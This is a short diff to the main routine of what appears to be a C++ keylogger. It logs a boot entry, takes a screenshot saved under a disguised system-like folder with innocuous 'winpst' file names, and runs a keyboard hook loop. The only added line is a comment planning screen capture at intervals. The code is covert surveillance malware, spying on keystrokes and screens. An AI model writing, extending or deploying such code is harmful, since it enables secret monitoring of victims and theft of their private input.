@@ -21,6 +21,7 @@ int main() {
   Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, true);
 
   Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\SystemService\)"), "winpst" + std::to_string(Screen::picId++) + ".jpeg");
+  // TODO capture in intervals
 
   KeyHook::HandleMessage(true);
 #endif
